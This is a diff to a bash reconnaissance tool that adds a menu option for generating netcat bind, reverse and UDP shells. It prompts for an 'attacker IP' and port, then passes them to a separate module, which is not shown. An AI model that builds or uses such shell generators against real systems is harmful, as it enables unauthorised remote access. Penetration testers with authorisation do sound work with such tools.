@@ -109,8 +109,9 @@ echo "6. WHOIS & Reverse Lookup Recon"
 echo "7. Passive OSINT (crt.sh, Wayback, RDAP)"
 echo "8. View Last Results"
 echo "9. Generate Report"
-echo "10. Exit / Cancel"
-read -p "Enter choice [1/2/3/4/5/6/7/8/9/10]: " choice
+echo "10. Netcat Shell Generator (bind / reverse shell)"
+echo "11. Exit / Cancel"
+read -p "Enter choice [1/2/3/4/5/6/7/8/9/10/11]: " choice
 echo ""
 
 # --- HANDLE USER CHOICE -------------------------------------
@@ -463,7 +464,41 @@ elif [[ "$choice" == "9" ]]; then
     log_output "[REPORT] Report generated: $report_file"
 
 elif [[ "$choice" == "10" ]]; then
-    echo -e "$(tput bold)[*] Exiting ALL-RECON Recon Engine. Stay unseen. [SAFE]$(tput sgr0)"
+    echo ""
+    echo "[] Netcat Shell Generator"
+    echo "1. Bind shell example"
+    echo "2. Reverse shell example"
+    echo "3. UDP shell example"
+    echo "4. Show all templates"
+    read -p "Select netcat shell template [1/2/3/4]: " netcat_choice
+    case "$netcat_choice" in
+        1)
+            read -p "Enter target port (default: 4444): " netcat_port
+            netcat_port=${netcat_port:-4444}
+            bash modules/netcat_shells.sh bind "$netcat_port" /bin/bash
+            ;;
+        2)
+            read -p "Enter attacker IP (default: 192.168.1.10): " netcat_ip
+            read -p "Enter target port (default: 4444): " netcat_port
+            netcat_ip=${netcat_ip:-192.168.1.10}
+            netcat_port=${netcat_port:-4444}
+            bash modules/netcat_shells.sh reverse "$netcat_ip" "$netcat_port" /bin/bash
+            ;;
+        3)
+            read -p "Enter UDP port (default: 4444): " netcat_port
+            netcat_port=${netcat_port:-4444}
+            bash modules/netcat_shells.sh udp "$netcat_port"
+            ;;
+        4)
+            bash modules/netcat_shells.sh list
+            ;;
+        *)
+            echo "[ERROR] Invalid netcat choice."
+            ;;
+    esac
+
+elif [[ "$choice" == "11" ]]; then
+    echo -e "$(tput bold)[*] Exiting ALL-RECON Recon Engine. Stay unseen.$(tput sgr0)"
     log_output "[STOP] Session ended"
     exit 0
 
